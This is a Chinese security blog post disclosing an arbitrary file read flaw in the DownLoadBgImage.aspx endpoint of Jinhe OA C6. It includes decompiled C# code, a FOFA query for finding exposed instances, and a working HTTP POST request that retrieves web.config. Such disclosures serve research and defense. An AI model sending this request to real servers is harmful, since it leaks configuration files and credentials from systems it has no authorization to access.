---
title: "金和OA DownLoadBgImage.aspx 文件读取漏洞"
source: https://mrxn.net/jswz/jhsoft-LoginTemplate-DownLoadBgImage-fileread.html
asset_dir: assets/金和oa-downloadbgimage.aspx-文件读取漏洞
---

# 金和OA DownLoadBgImage.aspx 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/10/18 13:36
* 583浏览
* [0评论](#comment)
* 17分钟阅读

深入探索

计算机安全

SQL

application


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

金和OA 是一款广泛应用于企业内部管理的办公自动化系统，旨在提供流程审批、文档管理、协同办公等功能，助力企业提升运营效率。然而，在金和OA系统的 DownLoadBgImage.aspx 接口处存在一处[文件读取漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)。攻击者可以通过精心构造的请求参数，绕过权限验证，直接读取服务器上的敏感文件内容。该漏洞可能导致系统配置文件、用户数据或其他关键信息的泄露，进而为攻击者提供进一步入侵系统的可能性，严重威胁企业信息安全。

漏洞预警服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"
>
> 网络安全

# 漏洞分析

深入探索

Web安全课程

代码安全审计

技术文章订阅

根据 `OuterAppTIDSave.aspx` 的源码，在 `bin` 目录下查找 `JHBase.Web.AddMenu.dll` 将其进行反编译后找到 **DownLoadBgImage** 的处理逻辑

计算机服务器

```
protected void Page_Load(object sender, EventArgs e)
{
  string filePath = this.Request["path"];
  string pathType = this.Request["pathType"];
  if (!string.IsNullOrEmpty(filePath))
  {
    try
    {
      this.DownLoad(filePath, pathType);
    }
```

如果参数 `path` 不为空或null，则进入`DownLoad`方法

```
protected void DownLoad(string filePath, string pathType)
{
  if (string.op_Inequality(pathType, "1"))
    filePath = this.Server.MapPath(filePath);
  string str = "image" + filePath.Substring(filePath.LastIndexOf("."));
  if (File.Exists(filePath))
  {
    FileStream fileStream = File.OpenRead(filePath);
    byte[] numArray = new byte[(int) ((Stream) fileStream).Length];
    ((Stream) fileStream).Read(numArray, 0, numArray.Length);
    ((Stream) fileStream).Close();
    this.Response.Clear();
    this.Response.ClearHeaders();
    this.Response.Buffer = true;
    this.Response.AppendHeader("Content-Disposition", "attachment;  filename=" + HttpUtility.UrlEncode(Encoding.UTF8.GetBytes(str)));
    this.Response.BinaryWrite(numArray);
  }
```

如果**参数pathType不等于1**则直接拼接**filePath**到当前请求物理路径上，然后进行文件读取、输出操作，整个过程没有任何校验或过滤，因此造成[文件读取漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)。

# 漏洞复现

```
POST /c6/Jhsoft.Web.AddMenu/LoginTemplate/DownLoadBgImage.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/x-www-form-urlencoded

path=/c6/web.config
```

[![金和OA DownLoadBgImage.aspx 文件读取漏洞](images/img-001-c471f4f51081.webp)](https://image.mrxn.net/082f83908fc140fc9335cd3e7f4cea48.webp)

成功读取到 web.config 文件内容

文件大小转换

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[金和OA DownLoadBgImage.aspx 文件读取漏洞](https://mrxn.net/jswz/jhsoft-LoginTemplate-DownLoadBgImage-fileread.html)  
文章链接：<https://mrxn.net/jswz/jhsoft-LoginTemplate-DownLoadBgImage-fileread.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-LoginTemplate-DownLoadBgImage-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞预警服务

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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